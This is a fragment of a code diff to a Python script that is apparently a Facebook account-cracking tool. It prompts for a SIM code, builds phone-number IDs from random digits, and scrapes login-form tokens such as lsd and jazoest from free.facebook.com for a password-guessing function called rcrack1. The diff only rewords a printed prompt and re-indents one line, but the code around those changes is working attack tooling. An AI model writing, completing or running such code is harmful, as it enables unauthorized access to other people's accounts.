@@ -191,7 +191,7 @@ def v2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] BD NUMBER  => 767 789 679')
+    print('[+] ENTER YOUR CODE  => 767 789 679')
     kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
@@ -231,7 +231,7 @@ def rcrack1(uid,pwx,tl):
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
